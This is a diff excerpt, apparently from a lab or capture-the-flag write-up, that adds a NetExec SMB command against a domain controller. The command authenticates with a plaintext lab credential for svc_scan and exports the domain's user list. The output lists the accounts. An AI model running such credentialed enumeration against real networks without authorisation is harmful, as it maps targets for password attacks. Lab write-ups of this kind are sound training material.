@@ -189,3 +189,27 @@ SMB         10.129.11.5     445    BRUNODC          NETLOGON        READ        
 SMB         10.129.11.5     445    BRUNODC          queue           READ,WRITE      
 SMB         10.129.11.5     445    BRUNODC          SYSVOL          READ            Logon server share
 ```
+
+```python
+nxc smb brunodc.bruno.vl -u svc_scan -p 'Sunshine1' --users-export users.txt    
+SMB         10.129.11.5     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.11.5     445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
+SMB         10.129.11.5     445    BRUNODC          -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.129.11.5     445    BRUNODC          Administrator                 2023-08-22 06:03:20 0       Built-in account for administering the computer/domain
+SMB         10.129.11.5     445    BRUNODC          Guest                         <never>             0       Built-in account for guest access to the computer/domain
+SMB         10.129.11.5     445    BRUNODC          krbtgt                        2022-06-29 13:22:03 0       Key Distribution Center Service Account
+SMB         10.129.11.5     445    BRUNODC          svc_net                       2022-06-29 13:35:45 0        
+SMB         10.129.11.5     445    BRUNODC          svc_scan                      2022-06-29 13:36:15 0        
+SMB         10.129.11.5     445    BRUNODC          Chloe.Ball                    2022-06-29 13:39:29 0        
+SMB         10.129.11.5     445    BRUNODC          Kayleigh.Patel                2022-06-29 13:39:32 0        
+SMB         10.129.11.5     445    BRUNODC          Donna.Harrison                2022-06-29 13:39:32 0        
+SMB         10.129.11.5     445    BRUNODC          Charles.Young                 2022-06-29 13:39:32 0        
+SMB         10.129.11.5     445    BRUNODC          Graeme.Grant                  2022-06-29 13:39:32 0        
+SMB         10.129.11.5     445    BRUNODC          Natalie.Anderson              2022-06-29 13:39:33 0        
+SMB         10.129.11.5     445    BRUNODC          Sam.Owen                      2022-06-29 13:39:33 0        
+SMB         10.129.11.5     445    BRUNODC          Jeremy.Singh                  2022-06-29 13:39:33 0        
+SMB         10.129.11.5     445    BRUNODC          Kieran.Day                    2022-06-29 13:39:34 0        
+SMB         10.129.11.5     445    BRUNODC          Hugh.Young                    2022-06-29 13:39:35 0        
+SMB         10.129.11.5     445    BRUNODC          [*] Enumerated 15 local users: BRUNO
+SMB         10.129.11.5     445    BRUNODC          [*] Writing 15 local users to users.txt
+```
